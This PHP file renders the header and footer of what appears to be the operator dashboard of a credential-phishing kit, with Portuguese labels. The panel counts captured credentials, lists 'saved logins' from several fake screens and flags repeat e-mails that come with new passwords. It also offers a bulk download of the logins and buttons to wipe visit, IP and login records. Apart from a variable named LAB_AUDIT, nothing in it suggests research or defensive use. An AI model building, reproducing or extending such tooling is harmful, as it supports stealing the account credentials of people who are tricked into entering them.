<?php
declare(strict_types=1);

function painel_header(string $title, string $active = 'dashboard'): void
{
    $user = e((string) ($_SESSION['admin_user'] ?? 'admin'));
    $panel = e(painel_name());
    $loginCount = (int) (unified_total_stats()['unique_credentials'] ?? 0);
    $marqueeMsg = e(painel_marquee());
    ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title><?= e($title) ?> — <?= $panel ?></title>
    <link href="/painel/assets/admin.css?v=9" rel="stylesheet">
</head>
<body class="admin-panel">
<header class="admin-header">
    <div class="header-brand">
        <div class="brand-marquee" aria-hidden="true">
            <div class="brand-marquee-track">
                <span class="marquee-piece marquee-brand"><?= $panel ?></span>
                <span class="marquee-dot">✦</span>
                <span class="marquee-piece marquee-msg"><?= $marqueeMsg ?></span>
                <span class="marquee-dot">✦</span>
            </div>
        </div>
        <h1 class="sr-only"><?= $panel ?></h1>
    </div>
    <nav class="admin-nav">
        <div class="nav-group nav-group-main">
            <a href="index.php" class="nav-pill <?= $active === 'dashboard' ? 'active' : '' ?>">Dashboard</a>
            <button type="button" class="btn-nav-ver-logins nav-pill-accent" id="btn-open-console">
                <span class="btn-mail-icon">📧</span>
                <span>Ver logins</span>
                <span class="btn-badge" id="nav-login-badge"><?= $loginCount ?></span>
            </button>
            <a href="download_logins.php" class="btn-nav-download nav-pill-accent">
                <span>⬇</span>
                <span>Baixar todos</span>
            </a>
        </div>
        <div class="nav-group nav-group-tools">
            <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar visitas de TODAS as telas?">
                <?= painel_action_field('clear:clicks') ?>
                <input type="hidden" name="action" value="clicks">
                <button type="submit" class="btn-clear-clicks">Apagar visitas</button>
            </form>
            <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar logs de IP?">
                <?= painel_action_field('clear:logs') ?>
                <input type="hidden" name="action" value="logs">
                <button type="submit" class="btn-clear-logs">Apagar IPs</button>
            </form>
            <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Apagar TODOS os logins?">
                <?= painel_action_field('clear:logins') ?>
                <input type="hidden" name="action" value="logins">
                <button type="submit" class="btn-clear-logins">Apagar logins</button>
            </form>
            <form method="post" action="clear_data.php" class="nav-inline-form panel-action-form" data-confirm="Liberar TODOS os IPs bloqueados?">
                <?= painel_action_field('clear:blocked_ips') ?>
                <input type="hidden" name="action" value="blocked_ips">
                <button type="submit" class="btn-clear-blocked">Liberar IPs</button>
            </form>
        </div>
        <div class="nav-group nav-group-user">
            <a href="alterar_senha.php" class="nav-pill <?= $active === 'senha' ? 'active' : '' ?>">Senha</a>
            <span class="user-badge"><?= $user ?></span>
            <a href="logout.php" class="nav-sair nav-pill">Sair</a>
        </div>
    </nav>
</header>
<main class="admin-main">
    <?php
}

function painel_footer(): void
{
    $consoleJson = '[]';
    if (painel_logged_in()) {
        try {
            $entries = unified_console_entries();
            $encoded = json_encode($entries, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS);
            $consoleJson = $encoded !== false ? $encoded : '[]';
        } catch (Throwable $e) {
            $consoleJson = '[]';
        }
    }
    ?>
</main>

<div id="login-console" class="login-console" hidden aria-hidden="true">
    <div class="login-console-backdrop" data-close-console></div>
    <div class="login-console-panel">
        <div class="login-console-top">
            <div class="login-console-title">
                <span class="console-traffic" aria-hidden="true">
                    <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
                </span>
                <span><?= e(painel_name()) ?></span>
                <span class="console-sub">logins salvos — todas as telas</span>
            </div>
            <button type="button" class="console-close" data-close-console aria-label="Fechar">✕</button>
        </div>
        <div class="login-console-legend">
            <span class="legend-green">● Verde</span> = 1º e-mail
            <span class="legend-yellow">● Amarelo</span> = mesmo e-mail, senha diferente
        </div>
        <div class="login-console-body" id="login-console-body">
            <div class="console-empty">Aguardando logins…</div>
        </div>
        <div class="login-console-foot">
            <button type="button" class="btn-sm btn-unblock" data-close-console>Fechar</button>
        </div>
    </div>
</div>

<script>window.LAB_AUDIT = <?= $consoleJson ?>;</script>
<script src="/painel/assets/admin.js?v=9"></script>
</body>
</html>
    <?php
}
